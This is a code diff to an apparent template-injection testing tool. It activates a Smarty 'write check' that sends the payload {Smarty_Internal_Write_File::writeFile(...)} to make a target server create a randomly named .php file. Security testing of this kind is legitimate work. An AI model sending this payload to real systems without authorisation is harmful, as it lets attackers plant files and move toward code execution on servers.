@@ -101,11 +101,11 @@ class Smarty(Check):
             
     def _check_write(self):
         
-        return
-        
-        rand_filename = ''.join(random.choice(string.letters) for _ in range(5)) + '.php'
+        rand_filename = rand.randstr_n(5) + '.php'
 
         payload = """{Smarty_Internal_Write_File::writeFile("%s","1",self::clearConfig())}""" % rand_filename
+        self.req(payload)
+        
         url_path = urlparse.urlparse(self.channel.url).path
         url_folder, url_file = os.path.split(url_path)
         
